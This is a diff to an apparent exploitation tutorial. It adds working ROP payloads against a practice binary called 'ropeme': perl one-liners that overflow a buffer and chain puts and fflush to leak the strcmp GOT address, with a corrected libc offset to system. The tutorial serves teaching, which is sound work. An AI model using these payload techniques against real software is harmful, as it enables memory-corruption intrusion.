@@ -497,7 +497,7 @@ more clearly:
 
 ::
 
-    $ perl -e 'print "A"x92 . "\x30\x83\x04\x08\x21\x85\x04\x08\xd0\x98\x04\x08"' |\
+    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\x7d\x85\x04\x08\x30\x99\x04\x08"' |\
       strace -e write ./ropeme admin42
     [ Process PID=26818 runs in 32 bit mode. ]
     write(1, "Enter password:\n", 16Enter password:
@@ -514,6 +514,36 @@ more clearly:
     0000000: b050 6ef7                                .Pn.
 
 So our address is 0xf76e50b0 in that instance.
+
+The reason I used strace is because if we try piping ropeme's output to
+another program (xxd for example in order to get directly an hexadecimal
+representation) we won't get any output. The reason is that puts() won't
+write directly to the pipe, the output is bufferized. This wouldn't be a
+problem normally because all output is flushed at process exit, but as we
+segfault we don't benefit from it. Strace is able to see the argument when
+the call occurs so before buffering, that's why it works here.
+
+There is another solution though: flushing manually the output. To do that we
+will use the fflush function. This function will take a pointer to the stdout
+file structure that we don't have... Meh, let's just call it in place:
+
+::
+
+    # Stack wanted:
+    #
+    # ^ [strcmp GOT  address] = 0x08049930
+    # | [flushing    address] = 0x080484fc
+    # | [puts        address] = 0x08048380
+    # | [padding to overflow] = "A" x 92
+
+    $ perl -e 'print "A"x92 . "\x80\x83\x04\x08\xfc\x84\x04\x08\x30\x99\x04\x08"' |\
+      ./ropeme admin42 | xxd
+    00000000: 456e 7465 7220 7061 7373 776f 7264 3a0a  Enter password:.
+    00000010: 5772 6f6e 6720 7061 7373 776f 7264 0ab0  Wrong password..
+    00000020: 7064 f750 125e f70a                      pd.P.^..
+    Segmentation fault (core dumped)
+
+There we are.
 
 Exercise 8
 ==========
@@ -538,7 +568,7 @@ example.
     [0x00020730]> ? 0x0007f650 - 0x0003f890
     261568 0x3fdc0 0776700 255.4K 3000:0dc0 261568 11000000 261568.0 0.000000f 0.000000
 
-So the offset between strcmp and system is 0x3fdc0.
+So the offset from strcmp to system is -0x3fdc0.
 
 Of course having it for a paste instance is quite useless, we must now find
 a way to use it without quitting the process. There are two strategies:
@@ -546,4 +576,3 @@ either we stay within the program and build the address by using ROP gadgets
 astuciously, either we consider use the program as a server, have it output
 the address, compute the offset outside the process and then have the process
 read the new address back.
-
